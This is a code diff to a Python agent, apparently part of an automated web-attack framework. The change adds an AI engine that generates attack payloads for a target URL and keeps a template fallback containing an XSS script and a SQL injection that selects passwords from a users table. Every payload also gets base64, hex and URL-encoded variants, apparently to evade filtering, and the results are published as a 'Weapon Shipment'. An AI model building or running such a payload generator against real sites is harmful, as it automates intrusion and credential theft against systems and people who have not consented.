@@ -4,6 +4,8 @@ import random
 import urllib.parse
 from backend.core.hive import BaseAgent, EventType, HiveEvent
 from backend.core.protocol import JobPacket, ResultPacket, AgentID
+from backend.ai.gi5 import GI5Engine
+import json
 
 class SigmaAgent(BaseAgent):
     """
@@ -16,7 +18,12 @@ class SigmaAgent(BaseAgent):
     def __init__(self, bus):
         super().__init__("agent_sigma", bus)
         
-        # SOTA: Mocking an LLM with advanced template interpolation
+        # SOTA: AI Generator 
+        try:
+            self.ai = GI5Engine()
+        except:
+             self.ai = None
+
         self.payload_templates = [
             "<script>alert('{context_var}')</script>",
             "UNION SELECT {context_table}, password FROM users--",
@@ -40,23 +47,37 @@ class SigmaAgent(BaseAgent):
         print(f"[{self.name}] Forging payloads for {packet.target.url}...")
         
         # 1. CONTEXT AWARE GENERATION
-        # Infer context from URL or Headers
-        context = {
-            "context_var": "XSS_BY_SIGMA",
-            "context_table": "admin_creds",
-            "cmd": "id"
-        }
-        
         generated_payloads = []
-        for template in self.payload_templates:
-            raw_payload = template.format(**context)
-            generated_payloads.append(raw_payload)
-            
-            # 2. OBFUSCATION ENGINE
-            # Generate variants
-            generated_payloads.append(self.obfuscate(raw_payload, "base64"))
-            generated_payloads.append(self.obfuscate(raw_payload, "hex"))
-            generated_payloads.append(self.obfuscate(raw_payload, "url"))
+        
+        # Try AI First
+        if self.ai and self.ai.enabled:
+             print(f"[{self.name}] >> Accessing Truth Kernel for Generative Payloads...")
+             # GI5 returns a list of dicts: [ {"name": "...", "json": {...}} ]
+             # We need to extract the raw strings or specialized JSON
+             variants = self.ai.synthesize_payloads({"url": packet.target.url, "method": "GET"})
+             for v in variants:
+                  # Extract payload string if possible
+                  p_str = json.dumps(v.get("json", {}))
+                  generated_payloads.append(p_str)
+        else:
+             # Fallback to Templates
+             context = {
+                "context_var": "XSS_BY_SIGMA",
+                "context_table": "admin_creds",
+                "cmd": "id"
+             }
+             for template in self.payload_templates:
+                raw_payload = template.format(**context)
+                generated_payloads.append(raw_payload)
+        
+        # 2. OBFUSCATION ENGINE (Applies to all)
+        final_payloads = []
+        for raw in generated_payloads:
+             final_payloads.append(raw)
+             # Add variants
+             final_payloads.append(self.obfuscate(raw, "base64"))
+             final_payloads.append(self.obfuscate(raw, "hex"))
+             final_payloads.append(self.obfuscate(raw, "url"))
 
         # Publish Results (The "Weapon Shipment")
         await self.bus.publish(HiveEvent(
@@ -65,10 +86,10 @@ class SigmaAgent(BaseAgent):
             payload={
                 "job_id": packet.id,
                 "status": "SUCCESS",
-                "data": {"generated_payloads": generated_payloads}
+                "data": {"generated_payloads": final_payloads}
             }
         ))
-        print(f"[{self.name}] Forged {len(generated_payloads)} SOTA payloads.")
+        print(f"[{self.name}] Forged {len(final_payloads)} SOTA payloads.")
 
     def obfuscate(self, payload: str, method: str) -> str:
         if method == "base64":
